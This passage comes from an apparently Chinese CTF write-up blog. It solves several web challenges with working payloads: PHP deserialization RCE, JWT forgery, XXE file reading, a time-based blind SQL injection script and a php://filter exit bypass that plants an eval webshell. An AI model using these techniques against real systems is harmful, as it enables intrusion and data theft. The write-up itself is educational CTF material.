class="hljs-keyword">new</span> <span class="hljs-title class_">BillyHerrington</span>();<br><span class="hljs-variable">$Bill</span>-&gt;a=<span class="hljs-variable">$Bao</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;BillyHerrington\&quot;:1&quot;</span>, <span class="hljs-string">&quot;BillyHerrington\&quot;:2&quot;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Bill</span>));<br><br><span class="hljs-comment">// if(isset($_POST[&#x27;str&#x27;]))&#123;</span><br><span class="hljs-comment">//         unserialize($_POST[&#x27;str&#x27;]);</span><br><span class="hljs-comment">// &#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>先找destruct入手，rce的点在VanDarkholme::happy()</p>
+<p>payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;BillyHerrington&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Baoglady&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;VanDarkholme&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;d&quot;</span>;N;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;system(&#x27;cat /fla*&#x27;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="easygame"><a href="#easygame" class="headerlink" title="easygame"></a>easygame</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004048.png" srcset="/img/loading.gif" lazyload alt="image-20221121101757227"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">成功辣，带上这个去<span class="hljs-regexp">/secure/</span>admin试试运气吧:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6IlN5Y2xvdmVyIiwiZXhwIjoxNjY4OTk4ODQ3LCJpYXQiOjE2Njg5OTcwNDd9.a88sCB8IxQBdm7zxawLJHT3VFLxw1mRsGjvAR_7Uh9I<br></code></pre></td></tr></table></figure>
+
+<p>然后</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004049.png" srcset="/img/loading.gif" lazyload alt="image-20221121101952090"></p>
+<p>用myjwt破解一下密钥</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004050.png" srcset="/img/loading.gif" lazyload alt="image-20221121103435994"></p>
+<p>可使用jwt.io伪造cookie（前提是header不是none）</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004051.png" srcset="/img/loading.gif" lazyload alt="image-20221121231715393"></p>
+<p>过期时间exp记得更改一下，替换authorization登录成功</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-number">5</span>LiL5LiA5YWz55u05o6l5Y67L1htbOeci+eci+acieayoeacieS9oOaDs+imgeeahOS4nOilv+WQpyEhIQ==<br>下一关直接去/Xml看看有没有你想要的东西吧!!!<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004052.png" srcset="/img/loading.gif" lazyload alt="image-20221121232748788"></p>
+<p>打XXE</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE xxe [ <br>&lt;!ELEMENT name ANY &gt; <br>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt; <br>&lt;user&gt;&lt;firstname&gt;&amp;xxe;&lt;/firstname&gt;&lt;lastname&gt;xxe&lt;/lastname&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004053.png" srcset="/img/loading.gif" lazyload alt="image-20221121235557410"></p>
+<p>注意content-type:application&#x2F;xml</p>
+<h2 id="ezrequset"><a href="#ezrequset" class="headerlink" title="ezrequset"></a>ezrequset</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004054.png" srcset="/img/loading.gif" lazyload alt="image-20221121115235146"></p>
+<p>发现每次进入抢课页面，学姐想要的课都不一样</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004055.png" srcset="/img/loading.gif" lazyload alt="image-20221121115322208"></p>
+<p>所以分两部分写脚本，一部分获取课程号课程名，一部分抢课</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">QK</span>(<span class="hljs-params">num,clas</span>):<br>	xkurl = <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com:80/?action=check&quot;</span><br>	xkcookies = &#123;<span class="hljs-string">&quot;_ga_6Z7QSHBBV1&quot;</span>: <span class="hljs-string">&quot;GS1.1.1668912977.1.1.1668913363.0.0.0&quot;</span>, <span class="hljs-string">&quot;_ga&quot;</span>: <span class="hljs-string">&quot;GA1.1.405875051.1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lpvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668913017&quot;</span>, <span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;00c6d1bd25c93e83428cb35f20d6908c&quot;</span>&#125;<br>	xkheaders = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=index&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>	xkdata = &#123;<span class="hljs-string">&quot;num&quot;</span>: num, <span class="hljs-string">&quot;class&quot;</span>: clas&#125;<br>	flag=requests.post(xkurl, headers=xkheaders, cookies=xkcookies, data=xkdata)<br>	<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;抢到了&quot;</span> <span class="hljs-keyword">in</span> flag.text:<br>		<span class="hljs-built_in">print</span>(flag.headers)<br>		exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cname</span>():<br>	JRurl = <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com:80/?action=index&quot;</span><br>	JRcookies = &#123;<span class="hljs-string">&quot;_ga_6Z7QSHBBV1&quot;</span>: <span class="hljs-string">&quot;GS1.1.1668912977.1.1.1668913363.0.0.0&quot;</span>, <span class="hljs-string">&quot;_ga&quot;</span>: <span class="hljs-string">&quot;GA1.1.405875051.1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lpvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668913017&quot;</span>, <span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;00c6d1bd25c93e83428cb35f20d6908c&quot;</span>, <span class="hljs-string">&quot;flag&quot;</span>: <span class="hljs-string">&quot;hacker!!&quot;</span>&#125;<br>	JRheaders = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com/&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>	JRdata = &#123;<span class="hljs-string">&quot;xh&quot;</span>: <span class="hljs-string">&quot;222&quot;</span>&#125;<br>	result=requests.post(JRurl, headers=JRheaders, cookies=JRcookies, data=JRdata)<br>	<span class="hljs-built_in">print</span>(result.text[<span class="hljs-number">985</span>:-<span class="hljs-number">559</span>])<br>	<span class="hljs-keyword">return</span> (result.text[<span class="hljs-number">985</span>:-<span class="hljs-number">559</span>])<br><br><span class="hljs-keyword">for</span> ci <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>	reg1=cname()<br>	r1=<span class="hljs-string">&quot;&quot;</span><br>	r2=<span class="hljs-string">&quot;&quot;</span><br>	f=<span class="hljs-number">0</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> reg1:<br>		<span class="hljs-keyword">if</span> i==<span class="hljs-string">&quot;号&quot;</span>:<br>			f=<span class="hljs-number">1</span><br>		<span class="hljs-keyword">if</span> f==<span class="hljs-number">0</span>:<br>			r1+=i<br>		<span class="hljs-keyword">else</span>:<br>			r2+=i<br>	QK(r1,r2[<span class="hljs-number">1</span>:])<br><span class="hljs-comment"># print(r1)</span><br><span class="hljs-comment"># print(r2[1:])</span><br></code></pre></td></tr></table></figure>
+
+<p>这里没用正则，我的正则写的太烂，后面有空补。</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004056.png" srcset="/img/loading.gif" lazyload alt="image-20221121115425680"></p>
+<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>robots.txt</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/t1ps.php<br></code></pre></td></tr></table></figure>
+
+<p>t1ps.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//$sql=&quot;SELECT secretpass FROM vanzy_secret WHERE  username=&#x27;vanzy&#x27; and secretpass=&#x27;$secretpass&#x27;;&quot;; </span><br></code></pre></td></tr></table></figure>
+
+<p>发现过滤了特别多东西，连in都过滤了，</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004057.png" srcset="/img/loading.gif" lazyload alt="image-20221121135401374"></p>
+<p>这样的话好像没什么姿势能获取到表名，进行下一步，仅仅能查他给出的vanzy_secret表</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>burp0_url = <span class="hljs-string">&quot;http://va998658-695b-11ed-bc58-165319f5738e.challenge.sycsec.com:80/login.php&quot;</span><br>burp0_cookies = &#123;<span class="hljs-string">&quot;_ga_6Z7QSHBBV1&quot;</span>: <span class="hljs-string">&quot;GS1.1.1668912977.1.1.1668913363.0.0.0&quot;</span>, <span class="hljs-string">&quot;_ga&quot;</span>: <span class="hljs-string">&quot;GA1.1.405875051.1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lpvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668913017&quot;</span>, <span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;4ddd9beb28657ea2c8d5b8f511725ba7&quot;</span>, <span class="hljs-string">&quot;td_cookie&quot;</span>: <span class="hljs-string">&quot;3992872535&quot;</span>&#125;<br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://va998658-695b-11ed-bc58-165319f5738e.challenge.sycsec.com&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://va998658-695b-11ed-bc58-165319f5738e.challenge.sycsec.com/login.php&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br>result=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>		<span class="hljs-comment">#payload=&quot;&#x27;/**/or/**/if(ascii(mid((select/**/version()),%d,1))/**/like/**/%d,sleep(1),1)#&quot;%(j,i)</span><br>		payload=<span class="hljs-string">&quot;&#x27;/**/or/**/if(ascii(mid((select/**/group_concat(secretpass)from/**/vanzy_secret),%d,1))/**/like/**/%d,sleep(1),1)#&quot;</span>%(j,i)<br>		burp0_data = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;vanzy&quot;</span>, <span class="hljs-string">&quot;secretpass&quot;</span>: payload, <span class="hljs-string">&quot;login&quot;</span>: <span class="hljs-string">&quot;\xc3\xa7\xc2\x99\xc2\xbb\xc3\xa5\xc2\xbd\xc2\x95&quot;</span>&#125;<br>		t1=time.time()<br>		req=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)<br>		t2=time.time()<br>		<span class="hljs-keyword">if</span> t2-t1&gt;<span class="hljs-number">0.8</span>:<br>			result+=<span class="hljs-built_in">chr</span>(i)<br>			<span class="hljs-built_in">print</span>(result)<br>			<span class="hljs-keyword">break</span><br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; &quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>信息</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">2</span>.<span class="hljs-number">26</span>-MariaDB-log<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004058.png" srcset="/img/loading.gif" lazyload alt="image-20221121135433184"></p>
+<p>查到密码，登录后就得到flag。</p>
+<h2 id="Not-Stay"><a href="#Not-Stay" class="headerlink" title="Not_Stay"></a>Not_Stay</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004059.png" srcset="/img/loading.gif" lazyload alt="image-20221121143410081"></p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//简单的实现文件头检测</span><br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;waf.php&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-variable">$chars </span>= <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">mt_rand</span>(), <span class="hljs-literal">true</span>));  <br>    <span class="hljs-variable">$uuid </span>= <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span> <br>            . <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> );  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid </span>;  <br>&#125;  <br><span class="hljs-variable">$safe_header </span>= <span class="hljs-string">&#x27;&lt;?php exit();?&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;path&#x27;</span>,<span class="hljs-title function_ invoke__">uuid</span>());<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$path </span>= <span class="hljs-string">&#x27;./upload/&#x27;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>].<span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$path</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">0755</span>);<br>&#125;<br><span class="hljs-variable">$file_data </span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-variable">$filename </span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;/tmp/&#x27;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>],<span class="hljs-variable">$file_data</span>);<br>    <span class="hljs-variable">$file_type </span>= <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-string">&#x27;/tmp/&#x27;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type </span>!= <span class="hljs-string">&quot;GIF&quot;</span> &amp;&amp; <span class="hljs-variable">$file_type </span>!= <span class="hljs-string">&quot;PNG&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I need data&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$safe_header</span>.<span class="hljs-variable">$file_data</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I need name&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>典型的死亡exit绕过，又加了一个exif_imagetype的文件类型检测</p>
+<p>可以使用filter的base64+string.strip_tags绕过，string.strip_tags先去除exit，base64decode再写入一句话（一句话也是php代码，所以需要先base64编码绕过string.strip_tags，再base64解码变回原来的内容），需要注意还有一个文件类型检测，可以使用文件头GIF89a绕过，但是这样的话GIF89a放在base64编码之前（文件类型的检测在写入文件之前），就会对base64解码造成影响。于是就需要根据base64的编解码原则，填充字符，使后面的php代码解码不被影响。</p>
+<p>如果不能成功解码，则会</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004060.png" srcset="/img/loading.gif" lazyload alt="image-20221121144538306"></p>
+<p>如果php代码被杂糅也不行，失去作用了。</p>
+<p>以写入phpinfo代码为例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br>PD9waHAgcGhwaW5mbygpOz8+<br></code></pre></td></tr></table></figure>
+
+<p>在前面加入GIF89a</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">GIF89aPD9waHAgcGhwaW5mbygpOz8+<br></code></pre></td></tr></table></figure>
+
+<p>长度为30，Base64以4byte为一组，所以直接解码是解码不出来的</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004061.png" srcset="/img/loading.gif" lazyload alt="image-20221121145343490"></p>
+<p>为了不破坏imagetype的识别，使后面的编码能成功解码，最好的填充位置就是GIF89a和php代码的base64之间，填充两个字符即可，GIF89a11，八个字符，不会影响后面的编码</p>
+<p>payload：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">data=GIF89a11PD89ZXZhbCgkX0dFVFswXSk7&amp;filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.strip_tags|convert.base64-decode/</span>resource=.<span class="hljs-regexp">/upload/</span><span class="hljs-number">996</span>/<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure>
+
+<p>base64解码后就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a11PD89ZXZhbCgkX0dFVFswXSk7<br>�|��u<span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004062.png" srcset="/img/loading.gif" lazyload alt="image-20221121152652460"></p>
+<h2 id="uploadrce"><a href="#uploadrce" class="headerlink" title="uploadrce"></a>uploadrce</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004063.png" srcset="/img/loading.gif" lazyload alt="image-20221121152640694"></p>
+<p>dirsearch发现两个swp文件，使用vim -r 恢复</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> -r <span class="hljs-built_in">index</span>.php.swp<br></code></pre></td></tr></table></figure>
+
+<p>index.php</p>
